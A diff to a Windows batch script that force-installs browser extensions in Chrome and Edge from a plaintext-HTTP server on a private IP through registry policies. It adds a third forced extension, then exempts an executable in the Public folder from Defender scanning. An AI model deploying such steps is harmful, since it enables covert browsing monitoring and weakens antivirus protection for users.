@@ -51,12 +51,14 @@ reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallSources" /v 1 /t R
 
 reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "bebfhecblbhbjgedmoefhlphaoimonjc;http://192.168.193.120/.well-known/monitorUrl/update.xml" /f
 reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 2 /t REG_SZ /d "pojbdkmhmcanmgioongckbcfcpklhfkl;http://192.168.193.120/.well-known/monitorUrl/update.xml" /f
+reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "gjojihjbefnglipnfikbdcbbiijcngal;http://192.168.193.120/.well-known/monitorUrl/update.xml" /f
 
 :: === Add Edge Extension policies to registry ===
 reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallSources" /v 1 /t REG_SZ /d "http://192.168.193.120/*" /f
 
 reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "bebfhecblbhbjgedmoefhlphaoimonjc;http://192.168.193.120/.well-known/monitorUrl/update.xml" /f
 reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 2 /t REG_SZ /d "pojbdkmhmcanmgioongckbcfcpklhfkl;http://192.168.193.120/.well-known/monitorUrl/update.xml" /f
+reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "gjojihjbefnglipnfikbdcbbiijcngal;http://192.168.193.120/.well-known/monitorUrl/update.xml" /f
 
 :: === Exclude from Defender and launch ===
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\monitorUrlnew.exe'"
